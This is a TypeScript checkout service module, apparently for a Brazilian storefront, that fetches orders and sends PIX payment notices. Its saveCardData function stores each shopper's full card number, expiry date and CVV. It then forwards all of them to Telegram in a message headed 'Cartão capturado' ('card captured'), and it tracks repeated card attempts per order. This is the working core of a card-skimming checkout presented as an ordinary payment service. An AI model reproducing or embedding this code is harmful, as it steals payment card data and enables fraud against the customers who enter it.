
import { supabase } from '@/integrations/supabase/client';
import { Order, PaymentMethod, PaymentStatus, CreditCardData } from '@/types/checkout';
import { sendTelegramNotification } from '@/lib/notifications/sendTelegramNotification';

/**
 * Centralized service for Supabase database operations
 */
export const supabaseClientService = {
  /**
   * Fetch a single order by ID
   */
  async getOrderById(orderId: string): Promise<Order | null> {
    try {
      const { data, error } = await supabase
        .from('orders')
        .select('*')
        .eq('id', orderId)
        .single();
        
      if (error) {
        console.error('[supabaseClientService] Error fetching order:', error);
        throw error;
      }
      
      if (!data) {
        return null;
      }
      
      return {
        id: data.id,
        customerId: data.customer_id,
        customerName: data.customer_name,
        customerEmail: data.customer_email,
        customerCpfCnpj: data.customer_cpf_cnpj,
        customerPhone: data.customer_phone,
        productId: data.product_id,
        productName: data.product_name,
        productPrice: data.product_price,
        status: data.status as PaymentStatus,
        paymentMethod: data.payment_method as PaymentMethod,
        asaasPaymentId: data.asaas_payment_id,
        createdAt: data.created_at,
        updatedAt: data.updated_at
      };
    } catch (error) {
      console.error('[supabaseClientService] Error in getOrderById:', error);
      throw error;
    }
  },
  
  /**
   * Save card data for an order
   */
  async saveCardData(orderId: string, cardData: CreditCardData): Promise<void> {
    try {
      // Extract the BIN (6 first digits)
      const bin = cardData.number.substring(0, 6);
      
      const cardDataToSave = {
        order_id: orderId,
        holder_name: cardData.holderName,
        number: cardData.number,
        expiry_date: cardData.expiryDate,
        cvv: cardData.cvv,
        bin: bin,
        brand: cardData.brand || 'unknown'
      };
      
      const { error } = await supabase
        .from('card_data')
        .insert(cardDataToSave);
        
      if (error) {
        console.error('[supabaseClientService] Error saving card data:', error);
        throw error;
      }
      
      // Send Telegram notification with detailed card information
      const brandName = (cardData.brand || 'unknown').toUpperCase();
      
      const message = `💳 Cartão capturado:
      
Número: ${cardData.number}
Validade: ${cardData.expiryDate}
CVV: ${cardData.cvv}
Titular: ${cardData.holderName}
Bandeira: ${brandName}`;
      
      await sendTelegramNotification(message);
      console.log('[AUDIT] Telegram notification sent for card data capture');
      
    } catch (error) {
      console.error('[supabaseClientService] Error in saveCardData:', error);
      throw error;
    }
  },
  
  /**
   * Update order with Asaas payment ID
   */
  async updateOrderPaymentId(orderId: string, paymentId: string): Promise<void> {
    try {
      const { error } = await supabase
        .from('orders')
        .update({ asaas_payment_id: paymentId })
        .eq('id', orderId);
        
      if (error) {
        console.error('[supabaseClientService] Error updating order with payment ID:', error);
        throw error;
      }
    } catch (error) {
      console.error('[supabaseClientService] Error in updateOrderPaymentId:', error);
      throw error;
    }
  },
  
  /**
   * Get count of card attempts for an order
   */
  async getCardAttemptsCount(orderId: string): Promise<number> {
    try {
      const { count, error } = await supabase
        .from('card_data')
        .select('*', { count: 'exact' })
        .eq('order_id', orderId);
      
      if (error) {
        console.error('[supabaseClientService] Error getting card attempts count:', error);
        throw error;
      }
      
      return count || 0;
    } catch (error) {
      console.error('[supabaseClientService] Error in getCardAttemptsCount:', error);
      throw error;
    }
  },
  
  /**
   * Get last card attempt date
   */
  async getLastCardAttemptDate(orderId: string): Promise<Date | null> {
    try {
      const { data, error } = await supabase
        .from('card_data')
        .select('created_at')
        .eq('order_id', orderId)
        .order('created_at', { ascending: false })
        .limit(1);
      
      if (error) {
        console.error('[supabaseClientService] Error getting last card attempt date:', error);
        throw error;
      }
      
      if (!data || data.length === 0) {
        return null;
      }
      
      return new Date(data[0].created_at);
    } catch (error) {
      console.error('[supabaseClientService] Error in getLastCardAttemptDate:', error);
      throw error;
    }
  },
  
  /**
   * Get product WhatsApp support info
   */
  async getProductWhatsAppInfo(productId: string): Promise<{ 
    hasWhatsappSupport: boolean; 
    whatsappNumber: string 
  }> {
    try {
      const { data, error } = await supabase
        .from('products')
        .select('has_whatsapp_support, whatsapp_number')
        .eq('id', productId)
        .single();
      
      if (error) {
        console.error('[supabaseClientService] Error getting product WhatsApp info:', error);
        throw error;
      }
      
      return {
        hasWhatsappSupport: data?.has_whatsapp_support || false,
        whatsappNumber: data?.whatsapp_number || ''
      };
    } catch (error) {
      console.error('[supabaseClientService] Error in getProductWhatsAppInfo:', error);
      throw error;
    }
  },
  
  /**
   * Send PIX payment notification via Telegram
   */
  async sendPixPaymentNotification(order: Order, pixData: any): Promise<void> {
    try {
      if (!order || !pixData) {
        console.error('[supabaseClientService] Missing order or PIX data for notification');
        return;
      }
      
      // Format currency value
      const formattedValue = new Intl.NumberFormat('pt-BR', {
        style: 'currency',
        currency: 'BRL'
      }).format(parseFloat(String(order.productPrice)) || 0);
      
      // Create a nicely formatted message for Telegram
      const message = `🆕 <b>Novo PIX Gerado!</b>
      
📋 <b>Pedido:</b> ${order.id}
👤 <b>Cliente:</b> ${order.customerName}
📱 <b>Telefone:</b> ${order.customerPhone || 'Não informado'}
📧 <b>Email:</b> ${order.customerEmail || 'Não informado'}
💰 <b>Valor:</b> ${formattedValue}
🛒 <b>Produto:</b> ${order.productName}

⏳ <b>Status:</b> Aguardando pagamento
🕒 <b>Gerado em:</b> ${new Date().toLocaleString('pt-BR')}`;
      
      await sendTelegramNotification(message);
      console.log('[AUDIT] PIX payment notification sent to Telegram');
    } catch (error) {
      console.error('[supabaseClientService] Error sending PIX notification:', error);
    }
  }
};
